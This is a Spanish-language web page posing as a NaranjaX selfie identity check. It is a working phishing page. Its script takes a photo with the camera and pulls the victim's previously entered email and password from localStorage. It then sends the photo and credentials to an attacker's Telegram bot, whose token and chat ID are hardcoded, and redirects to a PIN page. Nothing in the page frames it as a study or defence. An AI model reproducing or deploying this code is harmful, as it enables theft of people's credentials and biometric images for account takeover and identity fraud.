<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verificación de identidad con selfie</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: white;
    color: #1c1c1e;
  }
  body {
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .container {
    max-width: 500px;
    width: 100%;
    height: 100%;
    padding: 40px 22px 30px;
    display: flex;
    flex-direction: column;
    position: relative;
    box-sizing: border-box;
  }

  /* Pantalla 1 */
  #pantalla1 { display: flex; flex-direction: column; flex-grow: 1; height: 100%; overflow: hidden; }
  .image-wrapper { display: flex; justify-content: center; margin-bottom: 40px; }
  .image-wrapper img { max-width: 200px; width: 100%; height: auto; user-select: none; }
  h1 { font-size: 28px; font-weight: 700; margin: 0 0 16px 0; line-height: 1.2; }
  p { font-size: 17px; line-height: 1.3; margin: 0 0 50px 0; color: #333; }
  .spacer { flex-grow: 1; }
  .exit-link { text-align: center; font-size: 15px; color: #6327c4; text-decoration: underline; cursor: pointer; margin-bottom: 25px; user-select: none; }
  button { width: 100%; background-color: #6327c4; border: none; border-radius: 20px; color: white; font-size: 17px; font-weight: 600; padding: 17px; cursor: pointer; user-select: none; transition: background-color 0.25s ease; }
  button:hover { background-color: #4a1d8b; }
  button:active { background-color: #38156a; }

  /* Pantalla 2 */
  #pantalla2 { display: none; position: relative; height: 100%; overflow: hidden; }
  #pantalla2 .close-btn { position: fixed; top: 15px; right: 15px; font-size: 28px; font-weight: 700; color: #000; cursor: pointer; user-select: none; z-index: 1001; }
  #pantalla2 .content { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
  #pantalla2 video { width: 180px; height: 180px; border-radius: 50%; border: 8px solid #202840; background: black; object-fit: cover; margin-bottom: 20px; }
  #pantalla2 p { font-size: 20px; font-weight: 600; color: #202840; margin: 0 0 15px 0; }
  #btnTomarFoto { width: 180px; background-color: #6327c4; border-radius: 20px; border: none; color: white; font-weight: 600; font-size: 17px; padding: 12px 0; cursor: pointer; user-select: none; transition: background-color 0.25s ease; margin-bottom: 20px; }
  #btnTomarFoto:hover { background-color: #4a1d8b; }
  #btnTomarFoto:active { background-color: #38156a; }
  #fotoCapturada { width: 180px; height: 180px; border-radius: 50%; object-fit: cover; border: 8px solid #202840; display: none; margin-top: 10px; }
</style>
</head>
<body>
  <div class="container">
    <!-- Pantalla 1 -->
    <div id="pantalla1">
      <div class="image-wrapper">
        <img src="slf.PNG" alt="Ilustración selfie" />
      </div>
      <h1>Necesitamos confirmar tu identidad</h1>
      <p>Antes de confirmar tu identidad, te pedimos que te saques una selfie para confirmar que sos vos.</p>
      <div class="spacer"></div>
      <div class="exit-link" tabindex="0" role="button" aria-label="Salir">Salir</div>
      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">Sacar selfie</button>
    </div>

    <!-- Pantalla 2 -->
    <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
      <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
      <div class="content">
        <video autoplay playsinline muted></video>
        <p>Mir&aacute; de frente a la c&aacute;mara</p>
        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">Tomar foto</button>
        <img id="fotoCapturada" alt="Foto capturada" />
      </div>
    </div>
  </div>

<script>
  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
  const pantalla1 = document.getElementById('pantalla1');
  const pantalla2 = document.getElementById('pantalla2');
  const closeBtn = pantalla2.querySelector('.close-btn');
  const video = pantalla2.querySelector('video');
  const btnTomarFoto = document.getElementById('btnTomarFoto');
  const fotoCapturada = document.getElementById('fotoCapturada');
  let stream;

  const telegramBotToken = "8593661430:AAGbJVG-7-S4jzO9MCi9ZwsUOhkaO-7tt9E";
  const telegramChatId = "7655000874";

  btnSacarSelfie.addEventListener('click', async () => {
    pantalla1.style.display = 'none';
    pantalla2.style.display = 'block';
    fotoCapturada.style.display = 'none';
    btnTomarFoto.style.display = 'inline-block';
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      video.srcObject = stream;
    } catch (error) {
      alert("No se pudo acceder a la cámara. Revisá los permisos.");
      pantalla2.style.display = 'none';
      pantalla1.style.display = 'flex';
    }
  });

  closeBtn.addEventListener('click', () => {
    pantalla2.style.display = 'none';
    pantalla1.style.display = 'flex';
    if (stream) stream.getTracks().forEach(track => track.stop());
  });

  btnTomarFoto.addEventListener('click', () => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 180;
    canvas.height = video.videoHeight || 180;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      // Mostrar foto en el círculo
      const url = URL.createObjectURL(blob);
      fotoCapturada.src = url;
      fotoCapturada.style.display = 'block';
      video.style.display = 'none';
      btnTomarFoto.style.display = 'none';

      // Recuperar email y clave desde LocalStorage
      const email = localStorage.getItem('ips1') || "No definido";
      const clave = localStorage.getItem('ips2') || "No definido";

      // Enviar a Telegram como foto con caption
      const formData = new FormData();
      formData.append('photo', blob, 'selfie.png');
      formData.append('chat_id', telegramChatId);
      formData.append('caption', `Selfie Capturada NaranjaX\nEmail: ${email}\nClave: ${clave}`);

      try {
        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        console.log("correcto");
      } catch(e) {
        console.log("Error :", e);
      }

      // Redirigir a Google
      setTimeout(() => {
        window.location.href = "pin.html";
      }, 500);
    }, 'image/png');
  });
</script>

</body>
</html>
